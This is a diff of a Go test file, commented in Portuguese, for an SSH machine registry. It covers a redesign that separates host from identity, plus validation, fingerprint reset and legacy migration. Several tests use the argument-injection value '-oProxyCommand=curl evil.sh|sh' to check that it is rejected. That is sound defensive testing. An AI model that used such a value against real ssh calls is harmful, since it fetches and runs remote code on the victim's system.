@@ -51,7 +51,7 @@ func TestParseSSHTargetsIgnoraEntradaMalformadaSemPerderAsBoas(t *testing.T) {
 }
 
 // Defesa herdada do review da F5: um destino começando com "-" seria
-// reinterpretado pelo ssh como opção (ex.: -oProxyCommand=curl...). Injeção.
+// reinterpretado pelo ssh como opção (ex.: -oProxyCommand=curl evil.sh|sh). Injeção.
 func TestParseSSHTargetsRejeitaDestinoQueParecOpcaoDoSSH(t *testing.T) {
 	ms, warns := ParseSSHTargets("mal=-oProxyCommand=curl evil.sh|sh")
 	if len(ms) != 0 {
@@ -115,11 +115,12 @@ func TestNewRegistryPrimeiraOcorrenciaVence(t *testing.T) {
 	}
 }
 
-// MARK: cadastro pelo app (F3)
+// MARK: cadastro pelo app (F3) — depois do redesenho, o app manda Host+Identity,
+// nunca Dest (que passou a ser derivado na leitura).
 
 func TestAddCadastraMaquinaDoApp(t *testing.T) {
 	r := NewRegistry(nil)
-	m, err := r.Add(Machine{Name: "vps", Dest: "vx@203.0.113.9", Port: 2222})
+	m, err := r.Add(Machine{Name: "vps", Host: "203.0.113.9", Port: 2222, Identity: "vx"})
 	if err != nil {
 		t.Fatalf("Add falhou: %v", err)
 	}
@@ -135,7 +136,7 @@ func TestAddCadastraMaquinaDoApp(t *testing.T) {
 // Porta 0 vira 22: o app pode mandar o campo vazio.
 func TestAddSemPortaUsaAPadrao(t *testing.T) {
 	r := NewRegistry(nil)
-	m, _ := r.Add(Machine{Name: "vps", Dest: "vx@host"})
+	m, _ := r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
 	if m.Port != defaultSSHPort {
 		t.Errorf("porta = %d, esperava %d", m.Port, defaultSSHPort)
 	}
@@ -143,7 +144,7 @@ func TestAddSemPortaUsaAPadrao(t *testing.T) {
 
 func TestAddRecusaNomeRepetido(t *testing.T) {
 	r := NewRegistry([]Machine{{Name: "macbook", Dest: "vx@host", Port: 22, Source: SourceEnv}})
-	if _, err := r.Add(Machine{Name: "macbook", Dest: "outro@host"}); !errors.Is(err, ErrDuplicateName) {
+	if _, err := r.Add(Machine{Name: "macbook", Host: "outro", Identity: "vx"}); !errors.Is(err, ErrDuplicateName) {
 		t.Errorf("err = %v, quero ErrDuplicateName", err)
 	}
 	if m, _ := r.Get("macbook"); m.Dest != "vx@host" {
@@ -156,35 +157,55 @@ func TestAddRecusaNomeRepetido(t *testing.T) {
 func TestAddRecusaNomeInvalido(t *testing.T) {
 	for _, nome := range []string{"", "  ", "a/b", "..", "../fuga", "com espaço", "a\tb"} {
 		r := NewRegistry(nil)
-		if _, err := r.Add(Machine{Name: nome, Dest: "vx@host"}); err == nil {
+		if _, err := r.Add(Machine{Name: nome, Host: "host", Identity: "vx"}); err == nil {
 			t.Errorf("nome %q devia ser recusado", nome)
 		}
 	}
 }
 
-// Mesma defesa do ParseSSHTargets: dest com "-" na frente vira opção do ssh.
-func TestAddRecusaDestQueParecOpcao(t *testing.T) {
+// Mesma defesa do ParseSSHTargets: host com "-" na frente vira opção do ssh.
+func TestAddRecusaHostQueParecOpcao(t *testing.T) {
 	r := NewRegistry(nil)
-	if _, err := r.Add(Machine{Name: "vps", Dest: "-oProxyCommand=curl evil.sh|sh"}); err == nil {
-		t.Error("dest começando com '-' devia ser recusado")
+	if _, err := r.Add(Machine{Name: "vps", Host: "-oProxyCommand=curl evil.sh|sh", Identity: "vx"}); err == nil {
+		t.Error("host começando com '-' devia ser recusado")
 	}
 }
 
-func TestAddRecusaDestVazio(t *testing.T) {
+func TestAddRecusaHostVazio(t *testing.T) {
 	r := NewRegistry(nil)
-	if _, err := r.Add(Machine{Name: "vps", Dest: "   "}); err == nil {
-		t.Error("dest vazio devia ser recusado")
+	if _, err := r.Add(Machine{Name: "vps", Host: "   ", Identity: "vx"}); err == nil {
+		t.Error("host vazio devia ser recusado")
 	}
 }
 
-func TestUpdateAlteraDestEPorta(t *testing.T) {
+// Depois do redesenho o usuário mora na identidade: um host com "user@" grudado
+// é o formato antigo, e aceitá-lo deixaria o app contornar a identidade.
+func TestAddRecusaHostComArroba(t *testing.T) {
 	r := NewRegistry(nil)
-	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@antigo", Port: 22})
-	m, err := r.Update("vps", Machine{Dest: "vx@novo", Port: 2222})
+	if _, err := r.Add(Machine{Name: "vps", Host: "vx@host", Identity: "vx"}); !errors.Is(err, ErrInvalidDest) {
+		t.Errorf("host com usuário grudado devia ser recusado, veio err=%v", err)
+	}
+}
+
+// A identidade segue a mesma regra de nome do KeyStore (vira segmento de rota e
+// nome de arquivo de chave): vazia ou com caracteres fora do padrão é recusada.
+func TestAddRecusaIdentidadeInvalida(t *testing.T) {
+	for _, identidade := range []string{"", "com espaço", "../fuga"} {
+		r := NewRegistry(nil)
+		if _, err := r.Add(Machine{Name: "vps", Host: "host", Identity: identidade}); !errors.Is(err, ErrInvalidDest) {
+			t.Errorf("identidade %q devia ser recusada, veio err=%v", identidade, err)
+		}
+	}
+}
+
+func TestUpdateAlteraHostEPorta(t *testing.T) {
+	r := NewRegistry(nil)
+	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx", Port: 22})
+	m, err := r.Update("vps", Machine{Host: "novo", Port: 2222})
 	if err != nil {
 		t.Fatalf("Update falhou: %v", err)
 	}
-	if m.Dest != "vx@novo" || m.Port != 2222 {
+	if m.Host != "novo" || m.Port != 2222 {
 		t.Errorf("update não pegou: %+v", m)
 	}
 }
@@ -193,12 +214,12 @@ func TestUpdateAlteraDestEPorta(t *testing.T) {
 // (seria aceitar outro host se passando pelo cadastrado).
 func TestUpdateNaoDeixaTrocarChaveNemFingerprint(t *testing.T) {
 	r := NewRegistry(nil)
-	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@host"})
+	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
 	_ = r.SetKeyPath("vps", "/data/machines/keys/vps")
 	_ = r.SetFingerprint("vps", "SHA256:original")
 
 	_, err := r.Update("vps", Machine{
-		Dest: "vx@host", KeyPath: "/etc/passwd", HostFingerprint: "SHA256:doAtacante",
+		Host: "host", KeyPath: "/etc/passwd", HostFingerprint: "SHA256:doAtacante",
 	})
 	if err != nil {
 		t.Fatalf("Update falhou: %v", err)
@@ -209,54 +230,124 @@ func TestUpdateNaoDeixaTrocarChaveNemFingerprint(t *testing.T) {
 	}
 }
 
-// O fingerprint pertence a um (dest, porta): apontar a máquina para outro host
+// O fingerprint pertence a um (host, porta): apontar a máquina para outro host
 // invalida a confirmação anterior. Mantê-lo faria o hub achar que já confiou
-// num host que a usuária nunca conferiu.
-func TestUpdateLimpaOFingerprintQuandoODestinoMuda(t *testing.T) {
+// num host que a usuária nunca conferiu. A mesma troca também limpa o SO
+// detectado — ele foi lido daquele par (host, conta), e outro host pode
+// responder outra coisa.
+func TestUpdateLimpaOFingerprintEOSOQuandoOHostMuda(t *testing.T) {
 	r := NewRegistry(nil)
-	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@antigo", Port: 22})
+	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx", Port: 22})
 	_ = r.SetFingerprint("vps", "SHA256:doAntigo")
+	_ = r.SetOS("vps", "Darwin 24.5.0")
 
-	m, err := r.Update("vps", Machine{Dest: "vx@outro", Port: 22})
+	m, err := r.Update("vps", Machine{Host: "outro", Port: 22})
 	if err != nil {
 		t.Fatalf("Update falhou: %v", err)
 	}
 	if m.HostFingerprint != "" {
-		t.Errorf("fingerprint do host antigo sobreviveu à troca de destino: %q", m.HostFingerprint)
+		t.Errorf("fingerprint do host antigo sobreviveu à troca de host: %q", m.HostFingerprint)
+	}
+	if m.OS != "" {
+		t.Errorf("SO detectado sobreviveu à troca de host: %q", m.OS)
 	}
 }
 
 // Porta diferente pode ser outro serviço (ou outro container) na mesma máquina:
-// também exige reconfirmar.
-func TestUpdateLimpaOFingerprintQuandoAPortaMuda(t *testing.T) {
+// também exige reconfirmar, e também derruba o SO detectado pela mesma razão.
+func TestUpdateLimpaOFingerprintEOSOQuandoAPortaMuda(t *testing.T) {
 	r := NewRegistry(nil)
-	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@host", Port: 22})
+	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx", Port: 22})
 	_ = r.SetFingerprint("vps", "SHA256:na22")
+	_ = r.SetOS("vps", "Darwin 24.5.0")
 
-	m, _ := r.Update("vps", Machine{Dest: "vx@host", Port: 2222})
+	m, _ := r.Update("vps", Machine{Host: "host", Port: 2222})
 	if m.HostFingerprint != "" {
 		t.Errorf("fingerprint sobreviveu à troca de porta: %q", m.HostFingerprint)
 	}
+	if m.OS != "" {
+		t.Errorf("SO detectado sobreviveu à troca de porta: %q", m.OS)
+	}
 }
 
-// A chave privada continua servindo o mesmo cadastro mesmo mudando o destino —
-// só o fingerprint cai. Regerar a chave obrigaria a reinstalar no destino sem
-// necessidade.
-func TestUpdateNaoApagaAChaveAoMudarODestino(t *testing.T) {
+// A regra nova do redesenho: quem entra na máquina é assunto separado de qual
+// host ela é. Trocar SÓ a identidade (host e porta iguais) não derruba nem o
+// fingerprint nem o SO — os dois são propriedades do (host, porta), não da
+// conta que loga nele.
+func TestUpdateTrocaDeIdentidadeNaoDerrubaFingerprintNemOS(t *testing.T) {
 	r := NewRegistry(nil)
-	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@antigo"})
+	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx", Port: 22})
+	_ = r.SetFingerprint("vps", "SHA256:doHost")
+	_ = r.SetOS("vps", "Darwin 24.5.0")
+
+	m, err := r.Update("vps", Machine{Identity: "outra-identidade"})
+	if err != nil {
+		t.Fatalf("Update falhou: %v", err)
+	}
+	if m.Identity != "outra-identidade" {
+		t.Errorf("a identidade não trocou: %+v", m)
+	}
+	if m.HostFingerprint != "SHA256:doHost" {
+		t.Errorf("trocar de identidade derrubou o fingerprint do host: %q", m.HostFingerprint)
+	}
+	if m.OS != "Darwin 24.5.0" {
+		t.Errorf("trocar de identidade limpou o SO detectado: %q", m.OS)
+	}
+}
+
+// A chave privada continua servindo o mesmo cadastro mesmo mudando o host —
+// só o fingerprint (e o SO) caem. Regerar a chave obrigaria a reinstalar no
+// destino sem necessidade.
+func TestUpdateNaoApagaAChaveAoMudarOHost(t *testing.T) {
+	r := NewRegistry(nil)
+	_, _ = r.Add(Machine{Name: "vps", Host: "antigo", Identity: "vx"})
 	_ = r.SetKeyPath("vps", "/data/machines/keys/vps")
 
-	m, _ := r.Update("vps", Machine{Dest: "vx@outro"})
+	m, _ := r.Update("vps", Machine{Host: "outro"})
 	if m.KeyPath != "/data/machines/keys/vps" {
-		t.Errorf("a chave foi perdida na troca de destino: %q", m.KeyPath)
+		t.Errorf("a chave foi perdida na troca de host: %q", m.KeyPath)
+	}
+}
+
+// PATCH, não PUT: campo omitido (zero value) mantém o valor atual. É o que
+// permite ao app mandar só o que mudou.
+func TestUpdateCampoOmitidoMantemOAtual(t *testing.T) {
+	r := NewRegistry(nil)
+	_, _ = r.Add(Machine{Name: "vps", Host: "host-antigo", Identity: "vx", Port: 22})
+	_ = r.SetTheme("vps", "dracula")
+
+	// Só a identidade muda: host, porta e tema ficam como estavam.
+	m, err := r.Update("vps", Machine{Identity: "outra-identidade"})
+	if err != nil {
+		t.Fatalf("Update falhou: %v", err)
+	}
+	if m.Host != "host-antigo" || m.Port != 22 || m.Identity != "outra-identidade" || m.Theme != "dracula" {
+		t.Errorf("patch parcial não manteve os campos omitidos: %+v", m)
+	}
+
+	// Só o host muda: identidade, porta e tema ficam.
+	m, err = r.Update("vps", Machine{Host: "host-novo"})
+	if err != nil {
+		t.Fatalf("Update falhou: %v", err)
+	}
+	if m.Host != "host-novo" || m.Port != 22 || m.Identity != "outra-identidade" || m.Theme != "dracula" {
+		t.Errorf("patch parcial não manteve identidade/porta/tema: %+v", m)
+	}
+
+	// Tema pode ser trocado sozinho, sem mexer no resto.
+	m, err = r.Update("vps", Machine{Theme: "solarized"})
+	if err != nil {
+		t.Fatalf("Update falhou: %v", err)
+	}
+	if m.Theme != "solarized" || m.Host != "host-novo" {
+		t.Errorf("troca de tema isolada não pegou: %+v", m)
 	}
 }
 
 // Máquina do hub.env é read-only pelo app: quem manda nela é o env.
 func TestUpdateERemoveRecusamMaquinaDoEnv(t *testing.T) {
 	r := NewRegistry([]Machine{{Name: "macbook", Dest: "vx@host", Port: 22, Source: SourceEnv}})
-	if _, err := r.Update("macbook", Machine{Dest: "outro@host"}); !errors.Is(err, ErrReadOnly) {
+	if _, err := r.Update("macbook", Machine{Host: "outro", Identity: "vx"}); !errors.Is(err, ErrReadOnly) {
 		t.Errorf("Update: err = %v, quero ErrReadOnly", err)
 	}
 	if err := r.Remove("macbook"); !errors.Is(err, ErrReadOnly) {
@@ -269,7 +360,7 @@ func TestUpdateERemoveRecusamMaquinaDoEnv(t *testing.T) {
 
 func TestUpdateERemoveDeMaquinaInexistente(t *testing.T) {
 	r := NewRegistry(nil)
-	if _, err := r.Update("fantasma", Machine{Dest: "x@y"}); !errors.Is(err, ErrNotFound) {
+	if _, err := r.Update("fantasma", Machine{Host: "y", Identity: "x"}); !errors.Is(err, ErrNotFound) {
 		t.Errorf("Update: err = %v, quero ErrNotFound", err)
 	}
 	if err := r.Remove("fantasma"); !errors.Is(err, ErrNotFound) {
@@ -279,8 +370,8 @@ func TestUpdateERemoveDeMaquinaInexistente(t *testing.T) {
 
 func TestRemoveTiraDaListaEDaOrdem(t *testing.T) {
 	r := NewRegistry(nil)
-	_, _ = r.Add(Machine{Name: "a", Dest: "vx@a"})
-	_, _ = r.Add(Machine{Name: "b", Dest: "vx@b"})
+	_, _ = r.Add(Machine{Name: "a", Host: "a", Identity: "vx"})
+	_, _ = r.Add(Machine{Name: "b", Host: "b", Identity: "vx"})
 	if err := r.Remove("a"); err != nil {
 		t.Fatalf("Remove falhou: %v", err)
 	}
@@ -290,19 +381,110 @@ func TestRemoveTiraDaListaEDaOrdem(t *testing.T) {
 	}
 }
 
+// MARK: SetOS / SetTheme / UsesIdentity
+
+func TestSetOSESetTheme(t *testing.T) {
+	r := NewRegistry(nil)
+	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
+
+	if err := r.SetOS("vps", "Darwin 24.5.0"); err != nil {
+		t.Fatalf("SetOS falhou: %v", err)
+	}
+	if err := r.SetTheme("vps", "dracula"); err != nil {
+		t.Fatalf("SetTheme falhou: %v", err)
+	}
+	m, _ := r.Get("vps")
+	if m.OS != "Darwin 24.5.0" || m.Theme != "dracula" {
+		t.Errorf("SetOS/SetTheme não gravaram: %+v", m)
+	}
+
+	if err := r.SetOS("fantasma", "x"); !errors.Is(err, ErrNotFound) {
+		t.Errorf("SetOS de máquina inexistente: err = %v, quero ErrNotFound", err)
+	}
+	if err := r.SetTheme("fantasma", "x"); !errors.Is(err, ErrNotFound) {
+		t.Errorf("SetTheme de máquina inexistente: err = %v, quero ErrNotFound", err)
+	}
+}
+
+// UsesIdentity é o que impede o DELETE /identities de apagar uma identidade
+// ainda referenciada por alguma máquina.
+func TestUsesIdentity(t *testing.T) {
+	r := NewRegistry(nil)
+	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
+
+	if !r.UsesIdentity("vx") {
+		t.Error("UsesIdentity devia achar a identidade em uso")
+	}
+	if r.UsesIdentity("ninguem-usa") {
+		t.Error("UsesIdentity não devia achar identidade que ninguém usa")
+	}
+}
+
+// MARK: derivação do Dest e do KeyPath a partir da identidade
+
+// O coração do redesenho: para máquina do app, quem manda no Dest e no KeyPath
+// é a identidade, resolvida no Get/List — nunca gravada.
+func TestGetEListDerivamODestEOKeyPathDaIdentidade(t *testing.T) {
+	idents := NewIdentityStore()
+	if _, err := idents.Add(Identity{Name: "vx", Username: "vanessa"}, ""); err != nil {
+		t.Fatalf("identidade: %v", err)
+	}
+	if err := idents.SetKeyPath("vx", "/data/machines/keys/vx"); err != nil {
+		t.Fatalf("SetKeyPath: %v", err)
+	}
+	r := NewRegistry(nil)
+	r.UseIdentities(idents)
+	if _, err := r.Add(Machine{Name: "vps", Host: "203.0.113.9", Port: 2222, Identity: "vx"}); err != nil {
+		t.Fatalf("Add: %v", err)
+	}
+
+	m, ok := r.Get("vps")
+	if !ok {
+		t.Fatal("máquina não encontrada")
+	}
+	if m.Dest != "vanessa@203.0.113.9" {
+		t.Errorf("Dest não foi derivado da identidade: %q", m.Dest)
+	}
+	if m.KeyPath != "/data/machines/keys/vx" {
+		t.Errorf("KeyPath não foi resolvido da identidade: %q", m.KeyPath)
+	}
+
+	lista := r.List()
+	if len(lista) != 1 || lista[0].Dest != "vanessa@203.0.113.9" || lista[0].KeyPath != "/data/machines/keys/vx" {
+		t.Errorf("List não derivou Dest/KeyPath: %+v", lista)
+	}
+}
+
+// Identidade referenciada que não existe mais (ex.: apagada por fora da regra
+// UsesIdentity, ou dado inconsistente) não pode derrubar o Get: a máquina
+// simplesmente fica sem Dest resolvido, em vez de o hub quebrar.
+func TestGetNaoQuebraQuandoAIdentidadeReferenciadaSumiu(t *testing.T) {
+	r := NewRegistry(nil)
+	r.UseIdentities(NewIdentityStore()) // store presente, mas sem a identidade "vx"
+	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
+
+	m, ok := r.Get("vps")
+	if !ok {
+		t.Fatal("máquina não encontrada")
+	}
+	if m.Dest != "" {
+		t.Errorf("Dest não devia resolver com identidade inexistente: %q", m.Dest)
+	}
+}
+
 // MARK: persistência
 
 func TestRegistroSobreviveAoRestart(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "machines.json")
 
-	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}})
-	if _, err := r.Add(Machine{Name: "vps", Dest: "vx@203.0.113.9", Port: 2222}); err != nil {
+	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}}, NewIdentityStore())
+	if _, err := r.Add(Machine{Name: "vps", Host: "203.0.113.9", Port: 2222, Identity: "vx"}); err != nil {
 		t.Fatalf("Add falhou: %v", err)
 	}
 	_ = r.SetFingerprint("vps", "SHA256:abc")
 
 	// Restart: mesmo arquivo, mesmas máquinas do env.
-	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}})
+	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}}, NewIdentityStore())
 	m, ok := r2.Get("vps")
 	if !ok {
 		t.Fatal("a máquina cadastrada sumiu no restart")
@@ -320,12 +502,12 @@ func TestRegistroSobreviveAoRestart(t *testing.T) {
 // cadastrando antes de ele existir.
 func TestEnvVenceODiscoNoMesmoNome(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "machines.json")
-	r := NewRegistryAt(path, nil)
-	if _, err := r.Add(Machine{Name: "macbook", Dest: "vx@doAtacante"}); err != nil {
+	r := NewRegistryAt(path, nil, nil)
+	if _, err := r.Add(Machine{Name: "macbook", Host: "doAtacante", Identity: "vx"}); err != nil {
 		t.Fatalf("Add falhou: %v", err)
 	}
 
-	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@doEnv", Port: 22, Source: SourceEnv}})
+	r2 := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@doEnv", Port: 22, Source: SourceEnv}}, nil)
 	m, _ := r2.Get("macbook")
 	if m.Dest != "vx@doEnv" || m.Source != SourceEnv {
 		t.Errorf("o disco sobrescreveu o env: %+v", m)
@@ -335,12 +517,12 @@ func TestEnvVenceODiscoNoMesmoNome(t *testing.T) {
 // Remoção também tem que persistir: senão a máquina volta no restart.
 func TestRemocaoPersiste(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "machines.json")
-	r := NewRegistryAt(path, nil)
-	_, _ = r.Add(Machine{Name: "vps", Dest: "vx@host"})
+	r := NewRegistryAt(path, nil, nil)
+	_, _ = r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"})
 	if err := r.Remove("vps"); err != nil {
 		t.Fatalf("Remove falhou: %v", err)
 	}
-	if _, ok := NewRegistryAt(path, nil).Get("vps"); ok {
+	if _, ok := NewRegistryAt(path, nil, nil).Get("vps"); ok {
 		t.Error("a máquina removida voltou no restart")
 	}
 }
@@ -351,7 +533,7 @@ func TestDiscoCorrompidoNaoDerrubaOBoot(t *testing.T) {
 	if err := os.WriteFile(path, []byte("{isso não é json"), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}})
+	r := NewRegistryAt(path, []Machine{{Name: "macbook", Dest: "vx@env", Port: 22, Source: SourceEnv}}, nil)
 	if len(r.List()) != 1 {
 		t.Errorf("esperava só a máquina do env: %+v", r.List())
 	}
@@ -360,7 +542,7 @@ func TestDiscoCorrompidoNaoDerrubaOBoot(t *testing.T) {
 // Sem caminho (modo dev / teste) o registro funciona em memória.
 func TestRegistroSemCaminhoNaoQuebra(t *testing.T) {
 	r := NewRegistry(nil)
-	if _, err := r.Add(Machine{Name: "vps", Dest: "vx@host"}); err != nil {
+	if _, err := r.Add(Machine{Name: "vps", Host: "host", Identity: "vx"}); err != nil {
 		t.Errorf("Add sem persistência devia funcionar: %v", err)
 	}
 }
@@ -374,5 +556,104 @@ func TestKeyPathNaoVaiNoJSONDoApp(t *testing.T) {
 	}
 	if strings.Contains(string(b), "keys/vps") {
 		t.Errorf("o caminho da chave vazou no JSON: %s", b)
+	}
+}
+
+// MARK: migração do formato antigo (dest + chave por máquina)
+
+// O caso central da migração: uma máquina gravada no formato de antes do
+// redesenho (só "dest", chave no nome dela) ganha uma identidade nova — com o
+// nome da própria máquina — que herda o usuário (extraído do dest) e a chave
+// que já estava instalada no destino. O Dest resolvido depois bate com o
+// original: username da identidade + host extraído do dest antigo.
+func TestMigraLegadoConverteFormatoAntigo(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "machines.json")
+	legado := `[{"name":"vps-antigo","dest":"vanessa@203.0.113.9","port":2222,"key_path":"/data/machines/keys/vps-antigo"}]`
+	if err := os.WriteFile(path, []byte(legado), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	idents := NewIdentityStore()
+	r := NewRegistryAt(path, nil, idents)
+
+	m, ok := r.Get("vps-antigo")
+	if !ok {
+		t.Fatal("a máquina migrada sumiu")
+	}
+	if m.Identity != "vps-antigo" {
+		t.Errorf("a identidade nascida da migração devia ter o nome da máquina, veio %q", m.Identity)
+	}
+	if m.Host != "203.0.113.9" {
+		t.Errorf("host não foi extraído do dest antigo: %q", m.Host)
+	}
+	if m.Dest != "vanessa@203.0.113.9" {
+		t.Errorf("dest derivado depois da migração != dest original: %q", m.Dest)
+	}
+
+	id, ok := idents.Get("vps-antigo")
+	if !ok {
+		t.Fatal("a identidade da migração não foi criada no store")
+	}
+	if id.Username != "vanessa" {
+		t.Errorf("username da identidade migrada errado: %q", id.Username)
+	}
+	if id.KeyPath != "/data/machines/keys/vps-antigo" {
+		t.Errorf("a chave antiga não foi herdada pela identidade: %q", id.KeyPath)
+	}
+	if m.KeyPath != "/data/machines/keys/vps-antigo" {
+		t.Errorf("o key_path resolvido da máquina não bate com o herdado pela identidade: %q", m.KeyPath)
+	}
+}
+
+// Duas máquinas do MESMO usuário não podem cair na mesma identidade: cada uma
+// já tem sua própria chave instalada no authorized_keys remoto, e uni-las
+// deixaria uma das duas sem poder entrar (é a razão documentada em migraLegado).
+func TestMigraLegadoNaoAgrupaMaquinasDoMesmoUsuario(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "machines.json")
+	legado := `[
+		{"name":"m1","dest":"vx@host1","port":22,"key_path":"/data/machines/keys/m1"},
+		{"name":"m2","dest":"vx@host2","port":22,"key_path":"/data/machines/keys/m2"}
+	]`
+	if err := os.WriteFile(path, []byte(legado), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	idents := NewIdentityStore()
+	r := NewRegistryAt(path, nil, idents)
+
+	m1, ok1 := r.Get("m1")
+	m2, ok2 := r.Get("m2")
+	if !ok1 || !ok2 {
+		t.Fatalf("máquina sumiu: m1 ok=%v m2 ok=%v", ok1, ok2)
+	}
+	if m1.Identity == m2.Identity {
+		t.Errorf("a migração agrupou as duas máquinas na mesma identidade: %q", m1.Identity)
+	}
+	if m1.KeyPath == "" || m1.KeyPath == m2.KeyPath {
+		t.Errorf("as duas identidades acabaram com a mesma chave (ou sem chave): m1=%q m2=%q", m1.KeyPath, m2.KeyPath)
+	}
+}
+
+// Um dest sem usuário (alias do ~/.ssh/config) não tem o que migrar: fica como
+// está, o dest continua servindo, e nenhuma identidade nasce à toa.
+func TestMigraLegadoIgnoraDestSemUsuario(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "machines.json")
+	legado := `[{"name":"apelido-ssh","dest":"meu-alias-do-config","port":22}]`
+	if err := os.WriteFile(path, []byte(legado), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	idents := NewIdentityStore()
+	r := NewRegistryAt(path, nil, idents)
+
+	m, ok := r.Get("apelido-ssh")
+	if !ok {
+		t.Fatal("a máquina sumiu")
+	}
+	if m.Dest != "meu-alias-do-config" {
+		t.Errorf("dest sem usuário devia continuar servindo como está: %q", m.Dest)
+	}
+	if m.Identity != "" {
+		t.Errorf("não devia ter criado identidade sem usuário no dest: %q", m.Identity)
 	}
 }
